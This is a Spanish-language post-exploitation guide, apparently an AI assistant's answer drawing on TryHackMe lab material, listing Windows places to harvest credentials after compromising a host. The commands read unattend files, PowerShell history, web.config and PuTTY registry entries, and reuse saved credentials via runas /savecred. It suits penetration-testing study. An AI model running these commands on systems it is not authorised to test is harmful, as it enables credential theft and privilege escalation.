### Ubicaciones típicas en Windows donde se pueden recuperar credenciales tras comprometer un host

#### 1. Archivos de instalación desatendida

Credenciales de administrador pueden estar guardadas en texto claro en configuraciones de despliegue:

```
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```

Ejemplo de bloque:

```xml
<Credentials>
    <Username>Administrator</Username>
    <Domain>thm.local</Domain>
    <Password>MyPassword123</Password>
</Credentials>
```

#### 2. Historial de PowerShell

Comandos pasados se almacenan en texto plano. Si el usuario tipeó una contraseña dentro de un comando, queda registrado.

* Desde **cmd.exe**:

```
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

* Desde **PowerShell**:

```
type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

#### 3. Credenciales guardadas en Windows

Windows puede almacenar credenciales con `cmdkey`.

* Ver credenciales guardadas:

```
cmdkey /list
```

* Usarlas:

```
runas /savecred /user:admin cmd.exe
```

#### 4. Configuración de IIS

El archivo `web.config` puede contener credenciales de aplicaciones o cadenas de conexión. Ubicaciones comunes:

```
C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
```

Buscar cadenas de conexión:

```
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

#### 5. PuTTY (y software similar)

* PuTTY guarda configuraciones en el registro. El campo `ProxyPassword` puede contener credenciales en claro.

```
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

* Otros softwares que suelen exponer credenciales: navegadores, clientes de correo, clientes FTP/SSH/VNC.

---

¿Querés que te arme directamente un **cheat sheet con todos los comandos ejecutables** para cada vector (para usar como checklist rápida en pentests)?
